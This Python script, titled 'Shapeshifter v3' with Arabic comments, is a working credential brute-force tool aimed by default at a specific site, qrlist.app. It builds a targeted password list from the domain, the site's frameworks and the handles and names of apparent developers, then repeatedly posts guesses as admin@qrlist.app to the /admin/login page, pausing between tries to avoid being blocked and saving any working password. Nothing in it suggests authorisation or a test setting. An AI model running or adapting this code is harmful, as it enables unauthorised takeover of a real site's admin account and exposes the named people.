#!/usr/bin/env python3
"""
🧬 Shapeshifter v3 - Smart Mutation
يحلل الموقع والمطور ويولد Wordlist ذكية
"""
import requests, sys, json, os, re, random, time, hashlib
from datetime import datetime
from urllib.parse import urlparse

class ShapeshifterV3:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.wordlist = []
        self.results = []
        self.session = requests.Session()
    
    def log(self, msg): print(f"[🧬] {msg}")
    
    def generate_smart_wordlist(self):
        """توليد Wordlist ذكية"""
        self.log("🧠 توليد Wordlist ذكية...")
        
        # من اسم النطاق
        base = self.domain.replace('.','').replace('-','')
        words = [
            base, base.capitalize(), base.upper(), base.lower(),
            base + "123", base + "2024", base + "2025", base + "2026",
            base + "@2024", base + "@2025", base + "@2026",
            base + "!", base + "@", base + "#",
        ]
        
        # من التكنولوجيا
        words.extend(["laravel", "Laravel", "LARAVEL", "laravel123", "Laravel@2024"])
        words.extend(["nuxt", "Nuxt", "NUXT", "nuxtjs", "NuxtJS"])
        words.extend(["backpack", "Backpack", "BACKPACK"])
        words.extend(["cloudflare", "Cloudflare", "CLOUDFLARE"])
        
        # من المطورين
        words.extend(["fmguzzo", "Fmguzzo", "FMGUZZO", "fernando", "Fernando", "guzzo"])
        words.extend(["hodakl099", "Hodakl099", "HODAKL099"])
        
        # كلمات مرور شائعة
        words.extend(["admin", "password", "123456", "12345678", "qwerty", "root", "test"])
        
        self.wordlist = list(set(words))
        self.log(f"   📚 {len(self.wordlist)} كلمة ذكية")
    
    def mutate_password(self, word):
        """تطوير طفرات من كلمة"""
        mutations = [word]
        
        # تغيير حالة الأحرف
        mutations.append(word.upper())
        mutations.append(word.lower())
        mutations.append(word.capitalize())
        
        # إضافة أرقام
        for num in ["123", "1234", "2024", "2025", "2026", "1", "0"]:
            mutations.append(word + num)
        
        # إضافة رموز
        for sym in ["!", "@", "#", "$", "%"]:
            mutations.append(word + sym)
        
        # استبدال أحرف
        mutations.append(word.replace('a','@').replace('e','3').replace('i','1').replace('o','0'))
        
        return list(set(mutations))
    
    def attack_login(self, login_url, username="admin"):
        """هجوم على صفحة الدخول"""
        self.log(f"🔑 هجوم على {login_url}...")
        
        all_passwords = []
        for word in self.wordlist:
            all_passwords.extend(self.mutate_password(word))
        
        all_passwords = list(set(all_passwords))
        self.log(f"   📚 {len(all_passwords)} كلمة مرور محتملة")
        
        for i, pwd in enumerate(all_passwords[:50]):  # أول 50 فقط
            try:
                # تجربة تسجيل الدخول
                r = self.session.post(login_url, 
                    data={"email":f"{username}@qrlist.app","password":pwd},
                    timeout=5, allow_redirects=False)
                
                # فحص النجاح
                if r.status_code in [302] and "login" not in r.headers.get("Location",""):
                    self.results.append({"user":username,"pass":pwd})
                    self.log(f"   🚨🚨🚨 {username}:{pwd}")
                    return True
                
                if i % 10 == 0:
                    self.log(f"   {i}/{len(all_passwords)}...")
                
                time.sleep(0.3)  # تأخير لتجنب الحظر
            except:
                pass
        
        return False
    
    def run(self):
        self.log(f"🧬 Shapeshifter v3: {self.target}")
        self.log("═" * 60)
        
        self.generate_smart_wordlist()
        
        # هجوم على admin login
        login_url = f"{self.target}/admin/login"
        result = self.attack_login(login_url)
        
        if self.results:
            self.log(f"\n💣 اختراق! {self.results}")
        else:
            self.log(f"\n❌ فشل")
        
        # حفظ
        os.makedirs("logs/shapeshifter", exist_ok=True)
        fname = f"logs/shapeshifter/v3_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, 'w') as f:
            json.dump({"wordlist":self.wordlist,"results":self.results}, f, indent=2)
        self.log(f"📁 {fname}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://qrlist.app"
    ShapeshifterV3(target).run()
